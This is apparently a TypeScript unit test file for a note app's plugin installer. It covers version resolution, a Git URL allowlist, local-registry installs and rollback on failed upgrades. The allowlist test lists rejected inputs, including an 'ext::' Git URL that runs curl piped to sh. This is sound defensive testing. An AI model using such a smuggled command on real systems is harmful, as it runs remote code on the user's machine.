/**
 * 插件安装编排的单元测试（离线可复现，不依赖外网）。
 *
 * 压着的性质：
 * - **来源解析**：包名/版本区间的解析与 semver 选版决定"装到哪个版本"；
 * - **Git 地址白名单**：这是安全边界（`ext::` 传输助手等于远程执行命令）；
 * - **完整性校验**：内容与 registry 声明不一致时必须中止，而不是装上一个被篡改的包；
 * - **落盘与回滚**：升级失败必须保留旧版本，不能出现"插件目录被清空"。
 *
 * registry 用本地静态 HTTP 服务模拟（metadata + tarball 两端点），
 * 因此整份测试在无网络环境下也能跑出确定结果。
 */

import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { createServer, type Server } from 'node:http';
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  writeFileSync
} from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { after, before, describe, it } from 'node:test';
import * as tar from 'tar';
import {
  createLogger,
  installPlugin,
  parsePackageSpec,
  pickVersion,
  validateGitRepo
} from '@ricenote/core';

const logger = createLogger({ level: 'error' });

/* ------------------------------ 纯函数 ------------------------------ */

describe('parsePackageSpec：包名与版本区间', () => {
  it('解析普通包名与区间', () => {
    assert.deepEqual(parsePackageSpec('ricenote-nav'), { name: 'ricenote-nav', range: 'latest' });
    assert.deepEqual(parsePackageSpec('ricenote-nav@^1.2.0'), {
      name: 'ricenote-nav',
      range: '^1.2.0'
    });
    assert.deepEqual(parsePackageSpec('  ricenote-nav@1.2.3  '), {
      name: 'ricenote-nav',
      range: '1.2.3'
    });
  });

  it('作用域包不会被第一个 @ 切错', () => {
    assert.deepEqual(parsePackageSpec('@acme/ricenote-nav'), {
      name: '@acme/ricenote-nav',
      range: 'latest'
    });
    assert.deepEqual(parsePackageSpec('@acme/ricenote-nav@~2.0.0'), {
      name: '@acme/ricenote-nav',
      range: '~2.0.0'
    });
  });

  it('空包名被拒绝', () => {
    assert.throws(() => parsePackageSpec('   '), /不能为空/);
  });
});

describe('pickVersion：选版', () => {
  const packument = {
    'dist-tags': { latest: '2.0.0', next: '3.0.0-beta.1' },
    versions: {
      '1.0.0': { version: '1.0.0' },
      '1.2.0': { version: '1.2.0' },
      '2.0.0': { version: '2.0.0' },
      '3.0.0-beta.1': { version: '3.0.0-beta.1' }
    }
  };

  it('优先 dist-tag', () => {
    assert.equal(pickVersion(packument, 'latest', 'x'), '2.0.0');
    assert.equal(pickVersion(packument, 'next', 'x'), '3.0.0-beta.1');
  });

  it('语义化区间取满足条件的最高版本', () => {
    assert.equal(pickVersion(packument, '^1.0.0', 'x'), '1.2.0');
    assert.equal(pickVersion(packument, '>=1.0.0 <2.0.0', 'x'), '1.2.0');
    assert.equal(pickVersion(packument, '1.0.0', 'x'), '1.0.0');
  });

  it('无满足版本时报出可用版本', () => {
    assert.throws(() => pickVersion(packument, '^9.0.0', 'x'), /没有满足/);
  });

  it('空 registry 结果被拒绝', () => {
    assert.throws(() => pickVersion({ versions: {} }, 'latest', 'x'), /任何版本/);
  });
});

describe('validateGitRepo：地址白名单（安全边界）', () => {
  it('允许 https / ssh / scp 形式', () => {
    assert.equal(validateGitRepo('https://github.com/acme/nav.git'), 'https://github.com/acme/nav.git');
    assert.equal(validateGitRepo('ssh://git@git.example.com/acme/nav.git'), 'ssh://git@git.example.com/acme/nav.git');
    assert.equal(validateGitRepo('git@github.com:acme/nav.git'), 'git@github.com:acme/nav.git');
  });

  it('拒绝能执行命令或读本地仓库的形式', () => {
    for (const repo of [
      'ext::sh -c "curl evil.sh | sh"',
      'file:///srv/git/secret.git',
      '/srv/git/secret.git',
      'C:\\repos\\secret',
      '../relative/repo',
      'ftp://example.com/repo.git'
    ]) {
      assert.throws(() => validateGitRepo(repo), /不被允许/, `应拒绝：${repo}`);
    }
  });
});

/* --------------------------- 本地 registry --------------------------- */

interface LocalRegistry {
  origin: string;
  server: Server;
  /** 记录被请求的路径，用于断言"真的走了 registry 流程"。 */
  requests: string[];
}

/** 打一个最小插件包（tar.gz），返回 tarball 与完整性校验值。 */
function buildPluginTarball(input: {
  id: string;
  name: string;
  version: string;
  /** 是否写入入口文件（用于制造"缺少入口"的失败场景）。 */
  withEntry?: boolean;
}): { tarball: Buffer; integrity: string } {
  const staging = mkdtempSync(path.join(tmpdir(), 'ricenote-tar-'));
  const pkgDir = path.join(staging, 'package');
  mkdirSync(pkgDir, { recursive: true });

  writeFileSync(
    path.join(pkgDir, 'manifest.json'),
    JSON.stringify(
      {
        schemaVersion: 1,
        id: input.id,
        name: input.name,
        version: input.version,
        apiVersion: '^1.0.0',
        entry: './index.js',
        capabilities: []
      },
      null,
      2
    )
  );
  if (input.withEntry !== false) {
    writeFileSync(path.join(pkgDir, 'index.js'), 'export default {};\n');
  }

  const archivePath = path.join(staging, 'plugin.tgz');
  // npm tarball 一定是 package/ 前缀，locatePluginRoot 依赖这个事实
  tar.create({ gzip: true, file: archivePath, cwd: staging, sync: true }, ['package']);

  const tarball = readFileSync(archivePath);
  rmSync(staging, { recursive: true, force: true });

  return {
    tarball,
    integrity: `sha512-${createHash('sha512').update(tarball).digest('base64')}`
  };
}

async function startLocalRegistry(
  packages: Record<string, { versions: Record<string, Buffer>; tags?: Record<string, string> }>
): Promise<LocalRegistry> {
  const requests: string[] = [];
  /** tarball 索引：`<包名>-<版本>` → 内容（避免每次请求都遍历对象）。 */
  const tarballs = new Map<string, Buffer>();
  for (const [name, pkg] of Object.entries(packages)) {
    for (const [version, buffer] of Object.entries(pkg.versions)) {
      tarballs.set(`${name}-${version}`, buffer);
    }
  }

  let origin = '';
  const server = createServer((request, response) => {
    const url = request.url ?? '';
    requests.push(url);

    // tarball 端点：/tarballs/<包名>-<版本>.tgz
    const tarballMatch = /^\/tarballs\/(.+)\.tgz$/.exec(url);
    if (tarballMatch) {
      const buffer = tarballs.get(decodeURIComponent(tarballMatch[1]!));
      if (!buffer) {
        response.writeHead(404);
        response.end('not found');
        return;
      }
      response.writeHead(200, { 'content-type': 'application/octet-stream' });
      response.end(buffer);
      return;
    }

    // metadata 端点：/<包名>
    const name = decodeURIComponent(url.replace(/^\//, ''));
    const pkg = packages[name];
    if (!pkg) {
      response.writeHead(404);
      response.end('not found');
      return;
    }

    const versions: Record<string, unknown> = {};
    for (const [version, buffer] of Object.entries(pkg.versions)) {
      versions[version] = {
        version,
        dist: {
          tarball: `${origin}/tarballs/${name}-${version}.tgz`,
          integrity: `sha512-${createHash('sha512').update(buffer).digest('base64')}`
        }
      };
    }

    response.writeHead(200, { 'content-type': 'application/json' });
    response.end(
      JSON.stringify({
        'dist-tags': pkg.tags ?? { latest: Object.keys(pkg.versions).pop() },
        versions
      })
    );
  });

  await new Promise<void>((resolve) => {
    server.listen(0, '127.0.0.1', () => resolve());
  });
  const address = server.address();
  origin = typeof address === 'object' && address ? `http://127.0.0.1:${address.port}` : '';

  return { origin, server, requests };
}

/* ---------------------------- 编排（三段式） ---------------------------- */

describe('installPlugin：本地目录来源与回滚', () => {
  let root: string;
  let installDir: string;
  let cacheDir: string;
  let registry: LocalRegistry;

  before(async () => {
    root = mkdtempSync(path.join(tmpdir(), 'ricenote-install-'));
    installDir = path.join(root, 'third-party');
    cacheDir = path.join(root, 'cache');
    mkdirSync(installDir, { recursive: true });
    mkdirSync(cacheDir, { recursive: true });

    registry = await startLocalRegistry({
      'ricenote-plugin-demo': {
        versions: {
          '1.0.0': buildPluginTarball({ id: 'acme.demo', name: '演示插件', version: '1.0.0' }).tarball,
          '1.1.0': buildPluginTarball({ id: 'acme.demo', name: '演示插件', version: '1.1.0' }).tarball
        }
      },
      'ricenote-plugin-broken': {
        // 缺少入口文件：prepare 阶段必须失败，用于验证"升级失败保留旧版本"
        versions: {
          '2.0.0': buildPluginTarball({
            id: 'acme.demo',
            name: '演示插件（损坏）',
            version: '2.0.0',
            withEntry: false
          }).tarball
        }
      }
    });
  });

  after(async () => {
    await new Promise<void>((resolve) => registry.server.close(() => resolve()));
    rmSync(root, { recursive: true, force: true });
  });

  it('从本地目录安装：落盘、写来源、标记升级与否', async () => {
    const source = path.join(root, 'src-plugin');
    mkdirSync(source, { recursive: true });
    writeFileSync(
      path.join(source, 'manifest.json'),
      JSON.stringify({
        schemaVersion: 1,
        id: 'acme.local',
        name: '本地插件',
        version: '1.0.0',
        apiVersion: '^1.0.0',
        entry: './index.js',
        capabilities: []
      })
    );
    writeFileSync(path.join(source, 'index.js'), 'export default {};\n');

    const outcome = await installPlugin({
      source: { type: 'directory', path: source },
      installDir,
      cacheDir,
      logger
    });

    assert.equal(outcome.result.pluginId, 'acme.local');
    assert.equal(outcome.result.upgraded, false);
    assert.deepEqual(outcome.source, { type: 'local', spec: source, via: 'directory' });
    assert.ok(existsSync(path.join(installDir, 'local', 'manifest.json')));
    assert.ok(existsSync(path.join(installDir, 'local', 'index.js')));

    // 再装一次 → 视为升级，且不留瞬时目录
    const again = await installPlugin({
      source: { type: 'directory', path: source },
      installDir,
      cacheDir,
      logger
    });
    assert.equal(again.result.upgraded, true);
    const leftovers = readdirSync(installDir).filter((name) => /\.(incoming|backup)-/.test(name));
    assert.deepEqual(leftovers, [], '不应留下瞬时目录');
  });

  it('从本地 registry 安装：解析版本、下载并解包，来源记录解析结果', async () => {
    const outcome = await installPlugin({
      source: { type: 'registry', spec: 'ricenote-plugin-demo@^1.0.0' },
      installDir,
      cacheDir,
      logger,
      npm: { registry: registry.origin }
    });

    assert.equal(outcome.result.pluginId, 'acme.demo');
    assert.equal(outcome.result.version, '1.1.0', '应选满足 ^1.0.0 的最高版本');
    assert.equal(outcome.source.type, 'registry');
    assert.equal(outcome.source.resolvedVersion, '1.1.0');
    assert.ok(outcome.source.integrity?.startsWith('sha512-'), '应记录完整性校验值');
    assert.ok(existsSync(path.join(installDir, 'demo', 'index.js')));
    assert.ok(registry.requests.some((url) => url.startsWith('/ricenote-plugin-demo')));
  });

  it('未声明版本的包名走 dist-tag latest', async () => {
    const outcome = await installPlugin({
      source: { type: 'registry', spec: 'ricenote-plugin-demo' },
      installDir,
      cacheDir,
      logger,
      npm: { registry: registry.origin }
    });
    assert.equal(outcome.result.version, '1.1.0');
  });

  it('升级失败时保留旧版本（回滚），且不留下瞬时目录', async () => {
    const before = readFileSync(path.join(installDir, 'demo', 'manifest.json'), 'utf8');

    await assert.rejects(
      () =>
        installPlugin({
          source: { type: 'registry', spec: 'ricenote-plugin-broken@2.0.0' },
          installDir,
          cacheDir,
          logger,
          npm: { registry: registry.origin }
        }),
      /缺少入口文件/
    );

    // 旧版本必须原样保留（这正是"升级不能把插件搞没"的底线）
    assert.equal(readFileSync(path.join(installDir, 'demo', 'manifest.json'), 'utf8'), before);
    const leftovers = readdirSync(installDir).filter((name) => /\.(incoming|backup)-/.test(name));
    assert.deepEqual(leftovers, [], '失败后不应留下瞬时目录');
  });

  it('目标目录被另一个插件 ID 占用时拒绝安装', async () => {
    const clash = path.join(root, 'clash');
    mkdirSync(clash, { recursive: true });
    writeFileSync(
      path.join(clash, 'manifest.json'),
      JSON.stringify({
        schemaVersion: 1,
        id: 'other.demo',
        name: '同名短名的插件',
        version: '1.0.0',
        apiVersion: '^1.0.0',
        entry: './index.js',
        capabilities: []
      })
    );
    writeFileSync(path.join(clash, 'index.js'), 'export default {};\n');

    await assert.rejects(
      () => installPlugin({ source: { type: 'directory', path: clash }, installDir, cacheDir, logger }),
      /已被其他插件占用/
    );
    // 原目录未被破坏
    assert.equal(
      JSON.parse(readFileSync(path.join(installDir, 'demo', 'manifest.json'), 'utf8')).id,
      'acme.demo'
    );
  });

  it('清单缺少 manifest.json 的目录被拒绝', async () => {
    const empty = path.join(root, 'empty');
    mkdirSync(empty, { recursive: true });
    await assert.rejects(
      () => installPlugin({ source: { type: 'directory', path: empty }, installDir, cacheDir, logger }),
      /缺少 manifest.json/
    );
  });
});
